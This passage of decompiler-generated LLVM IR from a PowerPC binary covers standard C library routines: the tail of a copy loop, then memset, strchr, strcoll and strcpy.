  %v1_1001bcb016 = add i32 %v0_1001bcb015, -1
  store i32 %v1_1001bcb016, i32* %ctr.global-to-local, align 4
  %v2_1001bcb017 = icmp eq i32 %v1_1001bcb016, 0
  br i1 %v2_1001bcb017, label %dec_label_pc_1001bce4, label %dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge

dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge: ; preds = %dec_label_pc_1001bc94, %dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge
  %v3_1001bcac18 = phi i32 [ %v3_1001bcac, %dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge ], [ %v3_1001bcac13, %dec_label_pc_1001bc94 ]
  %v0_1001bca8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bca8 = add i32 %v0_1001bca8.pre, 1
  %v2_1001bca8 = inttoptr i32 %v1_1001bca8 to i8*
  %v3_1001bca8 = load i8, i8* %v2_1001bca8, align 1
  store i32 %v1_1001bca8, i32* %r4.global-to-local, align 4
  %v3_1001bcac = add i32 %v3_1001bcac18, 1
  %v4_1001bcac = inttoptr i32 %v3_1001bcac to i8*
  store i8 %v3_1001bca8, i8* %v4_1001bcac, align 1
  store i32 %v3_1001bcac, i32* %r9.global-to-local, align 4
  %v0_1001bcb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bcb0 = add i32 %v0_1001bcb0, -1
  store i32 %v1_1001bcb0, i32* %ctr.global-to-local, align 4
  %v2_1001bcb0 = icmp eq i32 %v1_1001bcb0, 0
  br i1 %v2_1001bcb0, label %dec_label_pc_1001bce4, label %dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge

dec_label_pc_1001bcb8:                            ; preds = %dec_label_pc_1001bc5c
  %v1_1001bcb8 = sub nsw i32 4, %v1_1001bc5c
  store i32 %v1_1001bcb8, i32* %ctr.global-to-local, align 4
  %v1_1001bcc0 = load i32, i32* @r5, align 4
  %v2_1001bcc0 = sub i32 %v1_1001bcc0, %v1_1001bcb8
  br label %dec_label_pc_1001bcc4

dec_label_pc_1001bcc4:                            ; preds = %dec_label_pc_1001bcc4.dec_label_pc_1001bcc4_crit_edge, %dec_label_pc_1001bcb8
  %v2_1001bccc = phi i32 [ %v1_1001bcd0, %dec_label_pc_1001bcc4.dec_label_pc_1001bcc4_crit_edge ], [ %v1_1001bc54, %dec_label_pc_1001bcb8 ]
  %v0_1001bcc4 = phi i32 [ %v0_1001bcc4.pre, %dec_label_pc_1001bcc4.dec_label_pc_1001bcc4_crit_edge ], [ %v1_1001bc50, %dec_label_pc_1001bcb8 ]
  %v1_1001bcc4 = add i32 %v0_1001bcc4, 4
  %v2_1001bcc4 = inttoptr i32 %v1_1001bcc4 to i8*
  %v3_1001bcc4 = load i8, i8* %v2_1001bcc4, align 1
  %v1_1001bcc8 = add i32 %v0_1001bcc4, 1
  store i32 %v1_1001bcc8, i32* %r4.global-to-local, align 4
  %v3_1001bccc = add i32 %v2_1001bccc, 4
  %v4_1001bccc = inttoptr i32 %v3_1001bccc to i8*
  store i8 %v3_1001bcc4, i8* %v4_1001bccc, align 1
  %v0_1001bcd0 = load i32, i32* @r11, align 4
  %v1_1001bcd0 = add i32 %v0_1001bcd0, 1
  store i32 %v1_1001bcd0, i32* @r11, align 4
  %v0_1001bcd4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bcd4 = add i32 %v0_1001bcd4, -1
  store i32 %v1_1001bcd4, i32* %ctr.global-to-local, align 4
  %v2_1001bcd4 = icmp eq i32 %v1_1001bcd4, 0
  br i1 %v2_1001bcd4, label %dec_label_pc_1001bcd8, label %dec_label_pc_1001bcc4.dec_label_pc_1001bcc4_crit_edge

dec_label_pc_1001bcc4.dec_label_pc_1001bcc4_crit_edge: ; preds = %dec_label_pc_1001bcc4
  %v0_1001bcc4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bcc4

dec_label_pc_1001bcd8:                            ; preds = %dec_label_pc_1001bcc4
  %v1_1001bcd8 = call i32 @__asm_rlwinm.(i32 %v2_1001bcc0, i32 29, i32 3, i32 31)
  store i32 %v1_1001bcd8, i32* %r9.global-to-local, align 4
  %v4_1001bcd8 = icmp eq i32 %v1_1001bcd8, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1001bcd8, label %dec_label_pc_1001bc7c, label %dec_label_pc_1001bcd8.dec_label_pc_1001bc64_crit_edge

dec_label_pc_1001bcd8.dec_label_pc_1001bc64_crit_edge: ; preds = %dec_label_pc_1001bcd8
  %v1_1001bc70.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001bc64

dec_label_pc_1001bce4:                            ; preds = %dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge, %dec_label_pc_1001bc94
  %v0_1001bce4 = load i32, i32* @r3, align 4
  ret i32 %v0_1001bce4

; uselistorder directives
  uselistorder i32 %v1_1001bcd8, { 1, 2, 0 }
  uselistorder i32 %v1_1001bcd4, { 1, 0 }
  uselistorder i32 %v1_1001bcd0, { 1, 0 }
  uselistorder i32 %v0_1001bcc4, { 1, 0 }
  uselistorder i32 %v2_1001bcc0, { 2, 1, 0 }
  uselistorder i32 %v1_1001bcb0, { 1, 0 }
  uselistorder i32 %v3_1001bcac, { 1, 2, 0 }
  uselistorder i32 %v1_1001bc7c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1001bc78, { 1, 0 }
  uselistorder i32 %v2_1001bc74, { 1, 2, 0 }
  uselistorder i32 %v1_1001bc5c, { 1, 0 }
  uselistorder i32 %v1_1001bc54, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1001bca8.dec_label_pc_1001bca8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001bc94, { 1, 0 }
  uselistorder label %dec_label_pc_1001bc7c, { 1, 0, 2 }
}

define i32 @__GI_memset() local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001bce8 = load i32, i32* @r5, align 4
  %v1_1001bce8 = call i32 @__asm_rlwinm.(i32 %v0_1001bce8, i32 29, i32 3, i32 31)
  store i32 %v1_1001bce8, i32* %r9.global-to-local, align 4
  %v4_1001bce8 = icmp eq i32 %v1_1001bce8, 0
  store i1 %v4_1001bce8, i1* %cr0_eq.global-to-local, align 1
  %v0_1001bcec = load i32, i32* @r4, align 4
  %v0_1001bcf0 = load i32, i32* @r3, align 4
  %v1_1001bcf0 = add i32 %v0_1001bcf0, -4
  store i32 %v1_1001bcf0, i32* %r11.global-to-local, align 4
  %v1_1001bcf4 = call i32 @__asm_rlwimi(i32 %v0_1001bcec, i32 8, i32 16, i32 23)
  %v1_1001bcf8 = call i32 @__asm_rlwimi(i32 %v1_1001bcf4, i32 16, i32 0, i32 15)
  %v2_1001bcf8 = trunc i32 %v1_1001bcf8 to i8
  store i32 %v1_1001bcf8, i32* @r10, align 4
  %v0_1001bcfc = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1001bcfc, label %dec_label_pc_1001bd20, label %dec_label_pc_1001bd00

dec_label_pc_1001bd00:                            ; preds = %entry
  %v0_1001bd00 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001bd00 = urem i32 %v0_1001bd00, 4
  %v3_1001bd00 = icmp eq i32 %v1_1001bd00, 0
  store i1 %v3_1001bd00, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1001bd00, label %dec_label_pc_1001bd00.dec_label_pc_1001bd08_crit_edge, label %dec_label_pc_1001bd50

dec_label_pc_1001bd00.dec_label_pc_1001bd08_crit_edge: ; preds = %dec_label_pc_1001bd00
  %v0_1001bd08.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001bd08

dec_label_pc_1001bd08:                            ; preds = %dec_label_pc_1001bd68.dec_label_pc_1001bd08_crit_edge, %dec_label_pc_1001bd00.dec_label_pc_1001bd08_crit_edge
  %v0_1001bd0c.pre = phi i32 [ %v0_1001bd00, %dec_label_pc_1001bd00.dec_label_pc_1001bd08_crit_edge ], [ %v0_1001bd0c.pre.pre, %dec_label_pc_1001bd68.dec_label_pc_1001bd08_crit_edge ]
  %v0_1001bd08 = phi i32 [ %v0_1001bd08.pre, %dec_label_pc_1001bd00.dec_label_pc_1001bd08_crit_edge ], [ %v1_1001bd68, %dec_label_pc_1001bd68.dec_label_pc_1001bd08_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1001bd00.dec_label_pc_1001bd08_crit_edge ], [ %v2_1001bd58, %dec_label_pc_1001bd68.dec_label_pc_1001bd08_crit_edge ]
  store i32 %v0_1001bd08, i32* %ctr.global-to-local, align 4
  %v1_1001bd10 = sext i8 %v2_1001bcf8 to i32
  br label %dec_label_pc_1001bd0c

dec_label_pc_1001bd0c:                            ; preds = %dec_label_pc_1001bd0c, %dec_label_pc_1001bd08
  %v0_1001bd0c = phi i32 [ %v1_1001bd18, %dec_label_pc_1001bd0c ], [ %v0_1001bd0c.pre, %dec_label_pc_1001bd08 ]
  %v1_1001bd0c = add i32 %v0_1001bd0c, 4
  store i32 %v1_1001bd0c, i32* %r9.global-to-local, align 4
  %v4_1001bd10 = inttoptr i32 %v1_1001bd0c to i32*
  store i32 %v1_1001bd10, i32* %v4_1001bd10, align 4
  %v2_1001bd14 = load i32, i32* %r9.global-to-local, align 4
  %v3_1001bd14 = add i32 %v2_1001bd14, 4
  %v4_1001bd14 = inttoptr i32 %v3_1001bd14 to i32*
  store i32 %v1_1001bd10, i32* %v4_1001bd14, align 4
  %v0_1001bd18 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bd18 = add i32 %v0_1001bd18, 4
  store i32 %v1_1001bd18, i32* %r11.global-to-local, align 4
  %v0_1001bd1c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bd1c = add i32 %v0_1001bd1c, -1
  store i32 %v1_1001bd1c, i32* %ctr.global-to-local, align 4
  %v2_1001bd1c = icmp eq i32 %v1_1001bd1c, 0
  br i1 %v2_1001bd1c, label %dec_label_pc_1001bd20, label %dec_label_pc_1001bd0c

dec_label_pc_1001bd20:                            ; preds = %dec_label_pc_1001bd0c, %dec_label_pc_1001bd68, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1001bd58, %dec_label_pc_1001bd68 ], [ %.0, %dec_label_pc_1001bd0c ]
  %v1_1001bd20 = urem i32 %.1, 8
  store i32 %v1_1001bd20, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1001bd20, 4
  br i1 %tmp, label %dec_label_pc_1001bd34, label %dec_label_pc_1001bd2c

dec_label_pc_1001bd2c:                            ; preds = %dec_label_pc_1001bd20
  %v1_1001bd2c = sext i8 %v2_1001bcf8 to i32
  %v2_1001bd2c = load i32, i32* %r11.global-to-local, align 4
  %v3_1001bd2c = add i32 %v2_1001bd2c, 4
  %v4_1001bd2c = inttoptr i32 %v3_1001bd2c to i32*
  store i32 %v1_1001bd2c, i32* %v4_1001bd2c, align 4
  store i32 %v3_1001bd2c, i32* %r11.global-to-local, align 4
  %v0_1001bd30 = load i32, i32* @r5, align 4
  %v1_1001bd30 = add i32 %v0_1001bd30, -4
  store i32 %v1_1001bd30, i32* @r5, align 4
  br label %dec_label_pc_1001bd34

dec_label_pc_1001bd34:                            ; preds = %dec_label_pc_1001bd20, %dec_label_pc_1001bd2c
  %v0_1001bd34 = phi i32 [ %v1_1001bd20, %dec_label_pc_1001bd20 ], [ %v1_1001bd30, %dec_label_pc_1001bd2c ]
  %v3_1001bd34 = icmp eq i32 %v0_1001bd34, 0
  %v0_1001bd38 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001bd34, i32 %v0_1001bd38)
  %v0_1001bd3c = load i32, i32* @r5, align 4
  store i32 %v0_1001bd3c, i32* %ctr.global-to-local, align 4
  %v0_1001bd40 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001bd40 = add i32 %v0_1001bd40, 3
  store i32 %v1_1001bd40, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001bd44

dec_label_pc_1001bd44:                            ; preds = %dec_label_pc_1001bd44, %dec_label_pc_1001bd34
  %v3_1001bd44 = phi i32 [ %v4_1001bd44, %dec_label_pc_1001bd44 ], [ %v1_1001bd40, %dec_label_pc_1001bd34 ]
  %v4_1001bd44 = add i32 %v3_1001bd44, 1
  %v5_1001bd44 = inttoptr i32 %v4_1001bd44 to i8*
  store i8 %v2_1001bcf8, i8* %v5_1001bd44, align 1
  store i32 %v4_1001bd44, i32* %r9.global-to-local, align 4
  %v0_1001bd48 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bd48 = add i32 %v0_1001bd48, -1
  store i32 %v1_1001bd48, i32* %ctr.global-to-local, align 4
  %v2_1001bd48 = icmp eq i32 %v1_1001bd48, 0
  br i1 %v2_1001bd48, label %dec_label_pc_1001bd74, label %dec_label_pc_1001bd44

dec_label_pc_1001bd50:                            ; preds = %dec_label_pc_1001bd00
  %v1_1001bd50 = sub nsw i32 4, %v1_1001bd00
  store i32 %v1_1001bd50, i32* %ctr.global-to-local, align 4
  %v1_1001bd58 = load i32, i32* @r5, align 4
  %v2_1001bd58 = sub i32 %v1_1001bd58, %v1_1001bd50
  br label %dec_label_pc_1001bd5c

dec_label_pc_1001bd5c:                            ; preds = %dec_label_pc_1001bd5c, %dec_label_pc_1001bd50
  %v3_1001bd5c = phi i32 [ %v1_1001bd60, %dec_label_pc_1001bd5c ], [ %v0_1001bd00, %dec_label_pc_1001bd50 ]
  %v4_1001bd5c = add i32 %v3_1001bd5c, 4
  %v5_1001bd5c = inttoptr i32 %v4_1001bd5c to i8*
  store i8 %v2_1001bcf8, i8* %v5_1001bd5c, align 1
  %v0_1001bd60 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001bd60 = add i32 %v0_1001bd60, 1
  store i32 %v1_1001bd60, i32* %r11.global-to-local, align 4
  %v0_1001bd64 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bd64 = add i32 %v0_1001bd64, -1
  store i32 %v1_1001bd64, i32* %ctr.global-to-local, align 4
  %v2_1001bd64 = icmp eq i32 %v1_1001bd64, 0
  br i1 %v2_1001bd64, label %dec_label_pc_1001bd68, label %dec_label_pc_1001bd5c

dec_label_pc_1001bd68:                            ; preds = %dec_label_pc_1001bd5c
  %v1_1001bd68 = call i32 @__asm_rlwinm.(i32 %v2_1001bd58, i32 29, i32 3, i32 31)
  store i32 %v1_1001bd68, i32* %r9.global-to-local, align 4
  %v4_1001bd68 = icmp eq i32 %v1_1001bd68, 0
  store i1 %v4_1001bd68, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1001bd68, label %dec_label_pc_1001bd20, label %dec_label_pc_1001bd68.dec_label_pc_1001bd08_crit_edge

dec_label_pc_1001bd68.dec_label_pc_1001bd08_crit_edge: ; preds = %dec_label_pc_1001bd68
  %v0_1001bd0c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001bd08

dec_label_pc_1001bd74:                            ; preds = %dec_label_pc_1001bd44
  %v0_1001bd74 = load i32, i32* @r3, align 4
  ret i32 %v0_1001bd74

; uselistorder directives
  uselistorder i32 %v1_1001bd68, { 1, 2, 0 }
  uselistorder i32 %v1_1001bd64, { 1, 0 }
  uselistorder i32 %v1_1001bd60, { 1, 0 }
  uselistorder i32 %v2_1001bd58, { 2, 1, 0 }
  uselistorder i32 %v1_1001bd48, { 1, 0 }
  uselistorder i32 %v4_1001bd44, { 1, 2, 0 }
  uselistorder i32 %v1_1001bd20, { 2, 1, 0 }
  uselistorder i32 %v1_1001bd1c, { 1, 0 }
  uselistorder i32 %v1_1001bd18, { 1, 0 }
  uselistorder i32 %v1_1001bd00, { 1, 0 }
  uselistorder i32 %v0_1001bd00, { 2, 1, 0 }
  uselistorder i8 %v2_1001bcf8, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1001bcf8, { 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 27, 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder label %dec_label_pc_1001bd34, { 1, 0 }
  uselistorder label %dec_label_pc_1001bd20, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1001bd78 = urem i32 %arg1, 256
  store i32 %v1_1001bd78, i32* %r4.global-to-local, align 4
  %v0_1001bd982 = load i32, i32* @r3, align 4
  %v1_1001bd983 = urem i32 %v0_1001bd982, 4
  %v3_1001bd985 = icmp eq i32 %v1_1001bd983, 0
  br i1 %v3_1001bd985, label %dec_label_pc_1001bda0, label %dec_label_pc_1001bd80

dec_label_pc_1001bd80:                            ; preds = %entry, %dec_label_pc_1001bd94
  %v1_1001bd84 = phi i32 [ %v0_1001bda0.pre, %dec_label_pc_1001bd94 ], [ %v1_1001bd78, %entry ]
  %v0_1001bd80 = phi i32 [ %v1_1001bd94, %dec_label_pc_1001bd94 ], [ %v0_1001bd982, %entry ]
  %v1_1001bd80 = inttoptr i32 %v0_1001bd80 to i8*
  %v2_1001bd80 = load i8, i8* %v1_1001bd80, align 1
  %v3_1001bd80 = zext i8 %v2_1001bd80 to i32
  %v4_1001bd84 = icmp eq i32 %v3_1001bd80, %v1_1001bd84
  %v3_1001bd88 = icmp eq i8 %v2_1001bd80, 0
  %v0_1001bd8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001bd84, i32 %v0_1001bd8c)
  br i1 %v3_1001bd88, label %dec_label_pc_1001be70, label %dec_label_pc_1001bd94

dec_label_pc_1001bd94:                            ; preds = %dec_label_pc_1001bd80
  %v0_1001bd94 = load i32, i32* @r3, align 4
  %v1_1001bd94 = add i32 %v0_1001bd94, 1
  store i32 %v1_1001bd94, i32* @r3, align 4
  %v1_1001bd98 = urem i32 %v1_1001bd94, 4
  %v3_1001bd98 = icmp eq i32 %v1_1001bd98, 0
  %v0_1001bda0.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1001bd98, label %dec_label_pc_1001bda0, label %dec_label_pc_1001bd80

dec_label_pc_1001bda0:                            ; preds = %dec_label_pc_1001bd94, %entry
  %v0_1001bdb810 = phi i32 [ %v0_1001bd982, %entry ], [ %v1_1001bd94, %dec_label_pc_1001bd94 ]
  %v0_1001bda0 = phi i32 [ %v1_1001bd78, %entry ], [ %v0_1001bda0.pre, %dec_label_pc_1001bd94 ]
  %v1_1001bda0 = mul i32 %v0_1001bda0, 256
  %v2_1001bda8 = or i32 %v1_1001bda0, %v0_1001bda0
  %v1_1001bdb0 = mul i32 %v2_1001bda8, 65536
  %v2_1001bdb4 = or i32 %v1_1001bdb0, %v2_1001bda8
  br label %dec_label_pc_1001bdb8

dec_label_pc_1001bdb8:                            ; preds = %dec_label_pc_1001bdb8, %dec_label_pc_1001be6c, %dec_label_pc_1001bda0
  %v0_1001be10 = phi i32 [ %v0_1001bdb810, %dec_label_pc_1001bda0 ], [ %v1_1001bdbc, %dec_label_pc_1001be6c ], [ %v1_1001bdbc, %dec_label_pc_1001bdb8 ]
  %v1_1001bdb8 = inttoptr i32 %v0_1001be10 to i32*
  %v2_1001bdb8 = load i32, i32* %v1_1001bdb8, align 4
  %v1_1001bdbc = add i32 %v0_1001be10, 4
  %v2_1001bdc4 = xor i32 %v2_1001bdb8, %v2_1001bdb4
  %v1_1001bdc8 = add i32 %v2_1001bdb8, 2130640639
  %v2_1001bdd0 = xor i32 %v1_1001bdc8, %v2_1001bdb8
  %v1_1001bdd4 = add i32 %v2_1001bdc4, 2130640639
  %v2_1001bdd8 = and i32 %v2_1001bdd0, -2130640640
  %v3_1001bdd8 = xor i32 %v2_1001bdd8, -2130640640
  %v2_1001bddc = xor i32 %v1_1001bdd4, %v2_1001bdc4
  %v2_1001bde0 = and i32 %v2_1001bddc, -2130640640
  %v3_1001bde0 = xor i32 %v2_1001bde0, -2130640640
  %v1_1001bdec = add i32 %v0_1001be10, 1
  store i32 %v1_1001bdec, i32* @r11, align 4
  %tmp = or i32 %v3_1001bde0, %v3_1001bdd8
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1001bdb8, label %dec_label_pc_1001bdf8

dec_label_pc_1001bdf8:                            ; preds = %dec_label_pc_1001bdb8
  %v2_1001bdf8 = inttoptr i32 %v0_1001be10 to i8*
  %v3_1001bdf8 = load i8, i8* %v2_1001bdf8, align 1
  %v4_1001bdf8 = zext i8 %v3_1001bdf8 to i32
  %v1_1001bdfc = add i32 %v0_1001be10, 2
  store i32 %v1_1001bdfc, i32* @r10, align 4
  %v1_1001be00 = add i32 %v0_1001be10, 3
  store i32 %v1_1001be00, i32* @r8, align 4
  %v4_1001be04 = icmp eq i32 %v4_1001bdf8, %v0_1001bda0
  br i1 %v4_1001be04, label %dec_label_pc_1001be10, label %dec_label_pc_1001be18

dec_label_pc_1001be10:                            ; preds = %dec_label_pc_1001bdf8
  ret i32 %v0_1001be10

dec_label_pc_1001be18:                            ; preds = %dec_label_pc_1001bdf8
  %v3_1001be08 = icmp eq i8 %v3_1001bdf8, 0
  br i1 %v3_1001be08, label %dec_label_pc_1001be70, label %dec_label_pc_1001be1c

dec_label_pc_1001be1c:                            ; preds = %dec_label_pc_1001be18
  %v2_1001be1c = inttoptr i32 %v1_1001bdec to i8*
  %v3_1001be1c = load i8, i8* %v2_1001be1c, align 1
  %v4_1001be1c = zext i8 %v3_1001be1c to i32
  %v4_1001be20 = icmp eq i32 %v4_1001be1c, %v0_1001bda0
  br i1 %v4_1001be20, label %dec_label_pc_1001be2c, label %dec_label_pc_1001be34

dec_label_pc_1001be2c:                            ; preds = %dec_label_pc_1001be1c
  ret i32 %v1_1001bdec

dec_label_pc_1001be34:                            ; preds = %dec_label_pc_1001be1c
  %v3_1001be24 = icmp eq i8 %v3_1001be1c, 0
  br i1 %v3_1001be24, label %dec_label_pc_1001be70, label %dec_label_pc_1001be38

dec_label_pc_1001be38:                            ; preds = %dec_label_pc_1001be34
  %v2_1001be38 = inttoptr i32 %v1_1001bdfc to i8*
  %v3_1001be38 = load i8, i8* %v2_1001be38, align 1
  %v4_1001be38 = zext i8 %v3_1001be38 to i32
  %v4_1001be3c = icmp eq i32 %v4_1001be38, %v0_1001bda0
  br i1 %v4_1001be3c, label %dec_label_pc_1001be48, label %dec_label_pc_1001be50

dec_label_pc_1001be48:                            ; preds = %dec_label_pc_1001be38
  ret i32 %v1_1001bdfc

dec_label_pc_1001be50:                            ; preds = %dec_label_pc_1001be38
  %v3_1001be40 = icmp eq i8 %v3_1001be38, 0
  br i1 %v3_1001be40, label %dec_label_pc_1001be70, label %dec_label_pc_1001be54

dec_label_pc_1001be54:                            ; preds = %dec_label_pc_1001be50
  %v2_1001be54 = inttoptr i32 %v1_1001be00 to i8*
  %v3_1001be54 = load i8, i8* %v2_1001be54, align 1
  %v4_1001be54 = zext i8 %v3_1001be54 to i32
  %v4_1001be58 = icmp eq i32 %v4_1001be54, %v0_1001bda0
  br i1 %v4_1001be58, label %dec_label_pc_1001be64, label %dec_label_pc_1001be6c

dec_label_pc_1001be64:                            ; preds = %dec_label_pc_1001be54
  ret i32 %v1_1001be00

dec_label_pc_1001be6c:                            ; preds = %dec_label_pc_1001be54
  %v3_1001be5c = icmp eq i8 %v3_1001be54, 0
  br i1 %v3_1001be5c, label %dec_label_pc_1001be70, label %dec_label_pc_1001bdb8

dec_label_pc_1001be70:                            ; preds = %dec_label_pc_1001bd80, %dec_label_pc_1001be6c, %dec_label_pc_1001be50, %dec_label_pc_1001be34, %dec_label_pc_1001be18
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1001bdbc, { 1, 0 }
  uselistorder i32 %v2_1001bdb8, { 0, 2, 1 }
  uselistorder i32 %v0_1001be10, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1001bda8, { 1, 0 }
  uselistorder i32 %v0_1001bda0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1001bd94, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1001bd982, { 2, 1, 0 }
  uselistorder i32 %v1_1001bd78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001be70, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1001bdb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001bd80, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001be84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001be7c

dec_label_pc_1001be7c:                            ; preds = %dec_label_pc_1001bea0, %entry
  %v0_1001be84 = phi i32 [ %v1_1001be88, %dec_label_pc_1001bea0 ], [ %v0_1001be84.pre, %entry ]
  %v0_1001be7c = phi i32 [ %v1_1001be80, %dec_label_pc_1001bea0 ], [ %tmp, %entry ]
  %v1_1001be7c = inttoptr i32 %v0_1001be7c to i8*
  %v2_1001be7c = load i8, i8* %v1_1001be7c, align 1
  %v3_1001be7c = zext i8 %v2_1001be7c to i32
  %v1_1001be84 = inttoptr i32 %v0_1001be84 to i8*
  %v2_1001be84 = load i8, i8* %v1_1001be84, align 1
  %v3_1001be84 = zext i8 %v2_1001be84 to i32
  %v3_1001be8c = icmp eq i8 %v2_1001be7c, 0
  br i1 %v3_1001be8c, label %dec_label_pc_1001be98, label %dec_label_pc_1001bea0

dec_label_pc_1001be98:                            ; preds = %dec_label_pc_1001be7c
  %v1_1001be98 = sub nsw i32 0, %v3_1001be84
  ret i32 %v1_1001be98

dec_label_pc_1001bea0:                            ; preds = %dec_label_pc_1001be7c
  %v4_1001be90 = icmp eq i8 %v2_1001be7c, %v2_1001be84
  %v1_1001be88 = add i32 %v0_1001be84, 1
  %v1_1001be80 = add i32 %v0_1001be7c, 1
  br i1 %v4_1001be90, label %dec_label_pc_1001be7c, label %dec_label_pc_1001bea4

dec_label_pc_1001bea4:                            ; preds = %dec_label_pc_1001bea0
  %v2_1001bea4 = sub nsw i32 %v3_1001be7c, %v3_1001be84
  ret i32 %v2_1001bea4

; uselistorder directives
  uselistorder i32 %v3_1001be84, { 1, 0 }
  uselistorder i32 %v0_1001be7c, { 1, 0 }
  uselistorder i32 %v0_1001be84, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1001beac = add i32 %arg1, -1
  %v1_1001beb0 = sub i32 %v2_1001beac, %tmp
  store i32 %v1_1001beb0, i32* %r9.global-to-local, align 4
  %v2_1001beb44 = load i8, i8* %arg2, align 1
  %v1_1001beb86 = add i32 %tmp, 1
  store i32 %v1_1001beb86, i32* %r4.global-to-local, align 4
  %v3_1001bebc8 = icmp eq i8 %v2_1001beb44, 0
  store i1 %v3_1001bebc8, i1* %cr7_eq.global-to-local, align 1
  %v5_1001bec09 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1001beb44, i8* %v5_1001bec09, align 1
  %v0_1001bec410 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001bec410, label %dec_label_pc_1001bec8, label %dec_label_pc_1001beb4.dec_label_pc_1001beb4_crit_edge

dec_label_pc_1001beb4.dec_label_pc_1001beb4_crit_edge: ; preds = %entry, %dec_label_pc_1001beb4.dec_label_pc_1001beb4_crit_edge
  %v0_1001beb4.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1001bec0.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1001beb4 = inttoptr i32 %v0_1001beb4.pre to i8*
  %v2_1001beb4 = load i8, i8* %v1_1001beb4, align 1
  %v1_1001beb8 = add i32 %v0_1001beb4.pre, 1
  store i32 %v1_1001beb8, i32* %r4.global-to-local, align 4
  %v3_1001bebc = icmp eq i8 %v2_1001beb4, 0
  store i1 %v3_1001bebc, i1* %cr7_eq.global-to-local, align 1
  %v4_1001bec0 = add i32 %v1_1001beb8, %v2_1001bec0.pre
  %v5_1001bec0 = inttoptr i32 %v4_1001bec0 to i8*
  store i8 %v2_1001beb4, i8* %v5_1001bec0, align 1
  %v0_1001bec4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001bec4, label %dec_label_pc_1001bec8, label %dec_label_pc_1001beb4.dec_label_pc_1001beb4_crit_edge

dec_label_pc_1001bec8:                            ; preds = %dec_label_pc_1001beb4.dec_label_pc_1001beb4_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
